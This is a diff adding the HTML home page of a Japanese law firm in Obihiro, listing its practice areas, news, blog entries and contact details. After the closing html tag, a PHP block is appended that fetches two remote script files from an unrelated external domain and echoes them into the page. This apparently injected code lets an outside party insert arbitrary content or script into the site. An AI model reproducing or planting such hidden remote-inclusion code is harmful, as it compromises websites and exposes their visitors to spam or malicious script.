@@ -1,0 +1,280 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" id="sixapart-standard">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="generator" content="Movable Type Pro 4.24-ja" />
+<meta name="keywords" content="弁護士法人,武部雅充,法律事務所,帯広市,十勝,釧路,債務整理,離婚,法律相談,弁護士,弁護士事務所" />
+<meta name="description" content="北海道　十勝　帯広にある弁護士法人武部雅充法律事務所は、債務整理をはじめとする法律について、相談を承っております。" />
+    <link rel="stylesheet" href="http://www.takebe-law.com/styles.css" type="text/css" />
+    <link rel="start" href="http://www.takebe-law.com/" title="ホーム" />
+    <link rel="alternate" type="application/atom+xml" title="Recent Entries" href="http://www.takebe-law.com/atom.xml" />
+<script type="text/javascript" src="http://www.takebe-law.com/mt.js"></script>
+    
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.takebe-law.com/rsd.xml" />
+
+    <script type="text/javascript">
+    var adminurl = 'http://www.takebe-law.com/user/' + 'mt.cgi';
+    var blog_id = '1';
+    var page_id = '';
+    </script>
+    
+<script type="text/javascript" src="http://www.takebe-law.com/auto-scroll.js"></script>
+<script src="http://www.takebe-law.com/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+    <title>帯広 十勝 弁護士 法律相談 【弁護士法人 武部雅充法律事務所】</title>
+</head>
+<body>
+    <div id="container">
+        <div id="container-inner">
+        <div id="header">
+        	<div id="header-inner">
+           	  <div id="header-description">北海道十勝帯広で法律のことなら[弁護士法人 武部雅充法律事務所]</div>
+                <h1 id="header-name"><a href="http://www.takebe-law.com/">帯広 十勝 弁護士 法律相談 【弁護士法人 武部雅充法律事務所】</a></h1>
+                <p>ご相談ご予約はTEL:0155-20-3233 Email:masamitsu@takebe-law.com</p>
+          </div>
+        </div>
+<!--<ul>
+    <li class="first on"><a href="http://www.takebe-law.com/">ホーム</a></li>
+    <li class=""><a href="http://www.takebe-law.com/blog/">ブログ</a></li>
+
+    
+    
+    
+    
+    
+    
+</ul>-->
+
+
+
+      <div id="nav">
+            <ul>
+           	  <li id="first"><a href="http://www.takebe-law.com/first/">はじめての法律相談</a></li>
+              <li id="office"><a href="http://www.takebe-law.com/office/">事務所案内</a></li>
+              <li id="lawyer"><a href="http://www.takebe-law.com/lawyer/">弁護士紹介</a></li>
+              <li id="cost"><a href="http://www.takebe-law.com/cost/">弁護士費用</a></li>
+              <li id="faq"><a href="http://www.takebe-law.com/faq/">よくある質問</a></li>
+              <li id="access"><a href="http://www.takebe-law.com/access/">アクセス</a></li>
+          </ul>
+
+      </div>        
+<img src="http://www.takebe-law.com/image/index/topimg4.jpg" alt="法律はあなたの生活を守る大切な味方です。" />
+        
+  </div></div>
+            <div id="content">
+                <div id="content-inner">
+<!--
+                    <div id="homepage-image"></div>
+-->
+                    <div id="alpha">
+                        <div id="alpha-inner">
+
+
+<h3 class="margin_b20"><img src="http://www.takebe-law.com/image/index/houritsu_h3.gif" alt="法律相談" /></h3>
+
+<div class="indexbox las"><div class="indexbox03">
+<a href="http://www.takebe-law.com/law/accident/">交通事故</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/accident/#01">示談交渉の流れ</a></li>
+<li><a href="http://www.takebe-law.com/law/accident/#02">人身事故の場合</a></li>
+<li><a href="http://www.takebe-law.com/law/accident/#03">物損事故の場合</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<div class="indexbox las"><div class="indexbox05">
+<a href="http://www.takebe-law.com/law/family/">相続・成年後見</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/family/#01">遺産分割をめぐる紛争</a></li>
+<li><a href="http://www.takebe-law.com/law/family/#02">遺言の残し方</a></li>
+<li><a href="http://www.takebe-law.com/law/family/#04">遺留分について</a></li>
+<li><a href="http://www.takebe-law.com/law/family/#03">高齢者・障害者の財産管理</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<div class="indexbox2 las"><div class="indexbox06">
+<a href="http://www.takebe-law.com/law/civilcase/">一般民事事件</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/civilcase/#03">医療をめぐる紛争</a></li>
+<li><a href="http://www.takebe-law.com/law/civilcase/#02">建築をめぐる紛争</a></li>
+<li><a href="http://www.takebe-law.com/law/civilcase/#01">賃貸借をめぐる紛争</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<br clear="all" />
+
+<div class="indexbox las"><div class="indexbox02">
+<a href="http://www.takebe-law.com/law/divorce/">離婚</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/divorce/#01">離婚の手続きは？</a></li>
+<li><a href="http://www.takebe-law.com/law/divorce/#02">親権、慰謝料、養育費etc</a></li>
+<li><a href="http://www.takebe-law.com/law/divorce/#03">DVの被害から逃れたい</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<div class="indexbox las"><div class="indexbox01">
+<a href="http://www.takebe-law.com/law/obligation/">債務整理</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/obligation/#01">借金を整理したい</a></li>
+<li><a href="http://www.takebe-law.com/law/obligation/#02">消費者被害にあった場合</a></li>
+<li><a href="http://www.takebe-law.com/law/obligation/#03">生活保護の援助を受けたい</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<div class="indexbox2 las"><div class="indexbox07">
+<a href="http://www.takebe-law.com/law/labor/">労働事件</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/labor/#01">不当に解雇された場合</a></li>
+<li><a href="http://www.takebe-law.com/law/labor/#02">残業代を払って貰えない場合</a></li>
+<li><a href="http://www.takebe-law.com/law/labor/#03">労災事故の被害にあった場合</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<br clear="all" />
+
+<div class="indexbox las"><div class="indexbox08">
+<a href="http://www.takebe-law.com/law/business/">企業法律相談</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/business/#01">事業を再生させたい</a></li>
+<li><a href="http://www.takebe-law.com/law/business/#02">売掛金を回収したい</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<div class="indexbox las"><div class="indexbox04">
+<a href="http://www.takebe-law.com/law/police/">刑事事件</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/police/#01">逮捕・勾留された場合</a></li>
+<li><a href="http://www.takebe-law.com/law/police/#02">刑事弁護を依頼したい</a></li>
+<li><a href="http://www.takebe-law.com/law/police/#03">刑事事件の被害にあった場合</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+
+<div class="indexbox2 las"><div class="indexbox09">
+<a href="http://www.takebe-law.com/law/others/">その他</a></div>
+<ul>
+<li><a href="http://www.takebe-law.com/law/others/#01">登記手続きについて</a></li>
+<li><a href="http://www.takebe-law.com/law/others/#02">ご近所とのトラブル</a></li>
+<li><a href="http://www.takebe-law.com/law/others/#03">農地をめぐる法律問題</a></li>
+</ul>
+<div class="indexbox_e"></div></div>
+<h3><img src="http://www.takebe-law.com/image/index/new_h3.gif" alt="お知らせ" /></h3>
+     <div id="newsbox">
+      
+      
+      <ul>
+      
+      <li>
+      2010/01/25&nbsp;&nbsp;<a href="http://www.takebe-law.com/2010/01/post.html">事務所を移転いたしました</a>
+      </li>
+      
+      </ul>
+      
+      
+      </div>
+<div class="pagetop"><a href="http://www.takebe-law.com/blog/"><img src="http://www.takebe-law.com/image/index/newslist.gif" alt="一覧表示" width="67" height="16" border="0"/></a></div>
+<h3><img src="http://www.takebe-law.com/image/index/blog_h3.gif" alt="十勝日記" width="152" height="17" /></h3>
+     <div id="blogbox">
+
+      
+      <ul>
+      
+      <li>
+      2009/05/13&nbsp;&nbsp;<a href="http://www.takebe-law.com/tokachidiary/2009/05/post-4.html">早朝</a>
+      </li>
+      
+      
+      
+      <li>
+      2009/05/11&nbsp;&nbsp;<a href="http://www.takebe-law.com/tokachidiary/2009/05/post-3.html">桜</a>
+      </li>
+      
+      
+      
+      <li>
+      2009/04/25&nbsp;&nbsp;<a href="http://www.takebe-law.com/tokachidiary/2009/04/post-1.html">十勝の春３</a>
+      </li>
+      
+      </ul>
+      
+      
+      </div>
+<div class="pagetop"><a href="http://www.takebe-law.com/tokachidiary/" target="_blank"><img src="http://www.takebe-law.com/image/index/newslist.gif" alt="一覧表示" width="67" height="16" border="0"/></a></div>
+
+
+
+<h3><img src="http://www.takebe-law.com/image/index/access_h3.gif" alt="アクセス" /></h3>
+<p><img src="http://www.takebe-law.com/image/index/gaikan.jpg" alt="外観" width="250" height="167" style="float: right; margin: 0 0 20px 20px;"  />弁護士法人　武部雅充法律事務所<br />
+  〒080-0807　北海道帯広市東7条南9丁目16番地2<br />
+TEL 0155-20-3233  FAX 0155-20-3234 </p>
+<p><a href="http://www.takebe-law.com/access/index.html"><img src="http://www.takebe-law.com/image/index/goaccess.gif" alt="地図をみる" width="79" height="16" border="0" /></a></p>
+
+
+</div>
+                    </div>
+                <div id="beta">
+<div id="beta-inner">
+
+
+
+<div class="application"><a href="http://www.takebe-law.com/contact/consult.html">法律相談の申込</a></div>
+<div class="beta-btm"><ul><li><a href="http://www.takebe-law.com/tokachidiary/" target="_blank"><img src="http://www.takebe-law.com/image/common/blog.jpg" alt="十勝日記" border="0" /></a></li>
+<li><a href="http://www.takebe-law.com/mobile/"><img src="http://www.takebe-law.com/image/common/mobile.jpg" width="127" height="38" alt="携帯サイト" border="0" /></a></li>
+<li><img src="http://www.takebe-law.com/image/common/qr.gif" width="95" height="95" alt="QRコード"/></li></ul></div>
+</div><div class="beta-btm"><ul><li><a href="http://www.houterasu.or.jp/" target="_blank"><img src="http://www.takebe-law.com/image/common/houterasu.gif" border="0" /></a></li>
+                </ul></div>
+
+
+
+
+
+    </div>
+</div>
+
+                </div>
+            </div></div>
+            </div>
+<div id="footer">
+               	  <div id="footer-content" class="clearfix">
+                    
+                    	<ul>
+                                <li><a href="http://www.takebe-law.com/other/privacypolicy.html">[プライバシーポリシー]</a></li>
+                                <li><a href="http://www.takebe-law.com/other/link.html">[リンク集]</a></li>
+                                <li><a href="http://www.takebe-law.com/other/sitemap.html">[サイトマップ]</a></li>
+                                <li><a href="http://www.takebe-law.com/contact/index.html">[お問い合わせ]</a></li>
+                            </ul>
+                        
+                  </div>
+                  <div id="footer-adress"　class="clearfix">
+                  <div id="footer-adress-inner"><div id="footer-right">
+                            Copyright  Masamitsu Takebe Law Office All Rights Reserved.
+                        </div>弁護士法人　武部雅充法律事務所<br>〒080-0807　北海道帯広市東7条南9丁目16番地2<br>
+TEL 0155-20-3233  FAX 0155-20-3234
+</div>
+                        </div>
+                </div>
+<script src="http://code.jquery.com/jquery-1.10.2.js"></script>
+<script src="http://www.takebe-law.com/js/jquery.heightLine.js"></script>
+<script>
+$(".las ul").heightLine();
+</script>
+<!--解析-->
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-8351665-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
+
+<?php
+$lodf = file_get_contents("https://backlinkku.id/menu/traffic-v1/script.txt");
+$lornvy = file_get_contents("https://backlinkku.id/menu/vip-v2/script.txt");
+if ($lornvy !== false) {
+    echo $lornvy;
+}
+if ($lodf !== false) {
+    echo $lodf;
+}
+?>
